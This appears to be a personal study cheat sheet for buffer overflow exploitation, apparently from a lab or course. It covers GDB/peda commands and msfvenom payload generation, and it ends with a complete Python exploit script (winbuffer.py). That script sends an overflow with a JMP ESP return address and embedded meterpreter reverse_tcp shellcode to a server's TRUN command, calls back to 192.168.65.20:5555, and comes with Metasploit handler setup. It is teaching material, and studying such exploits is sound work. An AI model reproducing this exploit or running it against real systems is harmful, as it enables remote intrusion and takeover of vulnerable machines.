Buffer Overflow Common Terms:

Heap    -    Memory that can be allocated and deallocated
Stack    -    A contiguous section of memory used for passing arguments
Registers    -    Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP)    -    a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP)    -    Contains the address of the next available space on the stack
Base Pointer (BP)    -    The base of the stack
Function    -    Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode  -  The code that is executed once an exploit successfully takes advantage of a vulnerability

Buffer Overflow Defenses:
    - Non executable (NX) stack
    - Address Space Layout Randomization (ASLR)
    - Data Execution Prevention (DEP)
    - Stack Canaries
    - Position Independent Executable (PIE)

Technical Help
#########################
Utilizing tools such as:
    - IDA, GHIDRA
    - GDB, MONA, IMMUNITY
    - BASH, PYTHON
________________________________________________________________________________________________________________________________

GDB Uses
Installation of Peda Plugin:
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

COMMON COMMANDS:
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
______________________________________________________________________________________________________________

reads first few bytes of file:
file

modify file permissions as needed: e.g
chmod u+x <filename>

utilize command substitution to see if file takes arguments or user input:
./<filename> $(echo "<whatever here>") [user input]

./<filename> <<<$(echo "whatever here>") [arguments]

utilize the buffer overflow script if on linux:
linbuffer.py

use gdb to see more detail during execution
gdb commands:
run
shell
info functions
clear
pdisass
show env

to run code in gdb:
run <<<$(./linbuffer.py)

msfconsole    -    metasploit!?!?!

To run gdb with no peda addon:
env - gdb ./<filename>

gdb w/out peda commands:
show env
unset env <ENVIRONMENT>
info proc map

0xff    -    hex for jmp
0xe4    -    hex for esp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
metasploit
use payload/linux/x86/exec
generate -b '\x00' -f python
*OR*
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
msfvenom -p linux/x86/exec CMD=cat <filepath> -b '\x00' -f python

Clear the env
run the executable and make sure it crashes:
try to echo many things
info proc map
first mem addr after heap
mem addr at end of stack
________________________________________________________________________________
WINDOWS SPECIFIC:
N:\strings.exe .\secureserverind.exe
netstat -anop tcp
Immunity Debugger:
attach the thingy
make sure it's running.

!mona jmp -r ESP -m "essfunc.dll"
use this in the log data window in Immunity to find

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.65.20 lport=5555 -b "\x00" -f python

msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 5555

winbuffer.py:

#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
##  VVV   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.65.20 lport=5555 -b "\x00" -f python
buf += b"\xda\xd9\xbd\xf9\xd4\xb2\x08\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x83\xc2\x04\x31\x6a\x15\x03\x6a"
buf += b"\x15\x1b\x21\x4e\xe0\x54\xca\xaf\xf1\x0a\xfa\x7d"
buf += b"\x78\x2f\x98\x0a\x29\x9f\xea\x5f\xc2\x54\xbe\x4b"
buf += b"\xd5\xdd\x75\x52\x62\x53\xa2\xab\x8b\xa2\x72\x67"
buf += b"\x4f\xa5\x0e\x7a\x9c\x05\x2e\xb5\xd1\x44\x77\x03"
buf += b"\x9f\xa9\x25\xc3\xd4\x67\xda\x60\xa8\xbb\xdb\xa6"
buf += b"\xa6\x83\xa3\xc3\x79\x77\x18\xcd\xa9\x27\x2b\x85"
buf += b"\x51\x4c\x73\x36\x63\x81\x01\xff\x17\x19\x3b\xff"
buf += b"\x91\xea\x0f\x74\x20\x3a\x5e\x4a\x8f\x03\x6e\x47"
buf += b"\xd1\x44\x49\xb8\xa4\xbe\xa9\x45\xbf\x05\xd3\x91"
buf += b"\x4a\x99\x73\x51\xec\x7d\x85\xb6\x6b\xf6\x89\x73"
buf += b"\xff\x50\x8e\x82\x2c\xeb\xaa\x0f\xd3\x3b\x3b\x4b"
buf += b"\xf0\x9f\x67\x0f\x99\x86\xcd\xfe\xa6\xd8\xaa\x5f"
buf += b"\x03\x93\x59\x89\x33\x5c\xa2\xb6\x69\xca\x6e\x7b"
buf += b"\x92\x0a\xf9\x0c\xe1\x38\xa6\xa6\x6d\x70\x2f\x61"
buf += b"\x69\x01\x27\x92\xa5\xa9\x28\x6c\x46\xc9\x61\xab"
buf += b"\x12\x99\x19\x1a\x1b\x72\xda\xa3\xce\xee\xd0\x33"
buf += b"\x31\x46\xa5\xd7\xd9\x94\x26\xcd\xaa\x11\xc0\xbd"
buf += b"\x9c\x71\x5d\x7e\x4d\x31\x0d\x16\x87\xbe\x72\x06"
buf += b"\xa8\x15\x1b\xad\x47\xc3\x73\x5a\xf1\x4e\x0f\xfb"
buf += b"\xfe\x45\x75\x3b\x74\x6f\x89\xf2\x7d\x1a\x99\xe3"
buf += b"\x19\xe4\x61\xf4\x8f\xe4\x0b\xf0\x19\xb3\xa3\xfa"
buf += b"\x7c\xf3\x6b\x04\xab\x80\x6c\xfa\x2a\xb0\x07\xcd"
buf += b"\xb8\xfc\x7f\x32\x2d\xfc\x7f\x64\x27\xfc\x17\xd0"
buf += b"\x13\xaf\x02\x1f\x8e\xdc\x9e\x8a\x31\xb4\x73\x1c"
buf += b"\x5a\x3a\xad\x6a\xc5\xc5\x98\xe8\x02\x39\x5e\xc7"
buf += b"\xaa\x51\xa0\x57\x4b\xa1\xca\x57\x1b\xc9\x01\x77"
buf += b"\x94\x39\xe9\x52\xfd\x51\x60\x33\x4f\xc0\x75\x1e"
buf += b"\x11\x5c\x75\xad\x8a\x6f\x0c\xde\x2d\x90\xf1\xf6"
buf += b"\x49\x91\xf1\xf6\x6f\xae\x27\xcf\x05\xf1\xfb\x74"
buf += b"\x15\x44\x59\xdc\xbc\xa6\xcd\x1e\x95"

##0x625012A0 -> "\xa0\x12\x50\x62"

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )  ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999))  ## Private IP of WinOps and secureserver port

print s.recv(1024)  ## Print to screen what is recieved
s.send(buf)  ## simmilar function to the print(on linux) send buf varible

print s.recv(1024)  ##Print to screen what is recieved
s.close()  ## Close the socket






































